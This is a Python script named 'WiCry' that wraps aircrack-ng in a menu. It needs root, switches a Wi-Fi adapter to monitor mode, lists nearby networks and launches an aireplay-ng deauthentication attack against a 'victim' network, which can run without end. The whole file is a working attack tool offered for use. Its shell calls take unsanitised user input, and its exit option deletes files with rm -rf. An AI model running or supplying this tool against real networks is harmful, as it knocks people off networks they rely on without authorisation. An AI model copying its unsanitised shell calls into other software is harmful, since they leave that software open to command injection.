
from colors import green, red, blue, white

import os, time, sys


white()
banner = """
 __          ___  _____
 \ \        / (_)/ ____|
  \ \  /\  / / _| |     _ __ _   _
   \ \/  \/ / | | |    | '__| | | |
    \  /\  /  | | |____| |  | |_| |
     \/  \/   |_|\_____|_|   \__, |
                              __/ |
                             |___/

"""

if os.geteuid() != 0:
    red()
    print('run with root')
    sys.exit(1)

wlan = None
def setup():
    global wlan
    red()
    print("")
    wlan = input("Wifi adapter:")
    os.system("airmon-ng check kill")
    os.system("airmon-ng start "+wlan+"")
    while True:
        menu(wlan)


def menu(wlan):
    green()
    os.system("clear")
    print(banner)
    print("              |                    1 -->> List WiFi networks")
    print("              |                    2 -->> Deauth Attack")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        red()
        print("Hit ctrl+c to stop")
        time.sleep(5)
        os.system("airodump-ng "+wlan+"")
        red()
        cont = input("(Press enter)")
        while True:
            menu(wlan)

    if x == "2":
        os.system("clear")
        red()
        print("")
        bssid = input("Victim WiFi BSSID:")
        print("")
        duration = input("Duration of deauth attack (For non stop write 0) ----> ")
        print("")
        channel3 = input("Channel:")
        print("")
        print("Hit ctrl + c to stop")
        time.sleep(5)
        white()
        print("")
        os.system("airmon-ng start "+wlan+" "+channel3+"")
        os.system("aireplay-ng --deauth "+duration+" -a "+bssid+" "+wlan+"")
        red()
        cont3 = input("Press enter")
        while True:
            menu(wlan)

    if x == "3":
        os.system("rm -rf backup/ file-01.csv red-python-scripts")
        os.system("clear")
        red()
        print("")
        restart = input("Do you want to restart your network? (y/n): ")
        if restart == "y":
            white()
            print("")
            os.system("airmon-ng stop "+wlan+"")
            os.system("systemctl restart NetworkManager.service")
            os.system("ifdown -a")
            os.system("ifup -a")
            os.system("clear")
            blue()
            print("zaLOOPenite")
            exit()
        if restart == "n":
            os.system("clear")
            blue()
            print("zaLOOPenite")
            exit()


setup()
